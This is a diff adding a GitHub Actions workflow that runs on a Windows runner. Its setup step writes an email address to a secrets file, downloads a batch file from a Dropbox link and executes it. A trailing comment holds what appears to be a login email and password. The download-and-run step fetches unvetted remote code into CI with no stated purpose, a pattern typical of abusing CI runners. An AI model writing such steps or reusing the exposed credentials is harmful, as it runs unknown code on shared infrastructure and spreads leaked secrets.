@@ -1,0 +1,20 @@
+name: FF
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: windows-latest
+
+    steps:
+      - name: Downloading & Setting Up
+        run: |
+         echo "EMAIL_SECRET=ainxd@hldrive.com" > secrets.txt
+         Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/0cu5rqw2xc7vbfrbbnmb5/down.bat?rlkey=fobsta0we43wswzx4saj4f04p&dl=1" -OutFile "down.bat"
+         cmd /c down.bat
+
+      - name: Time Counter
+        run: python time.py
+
+#db="iteikx@wireconnected.com:6%c'KtHy"#
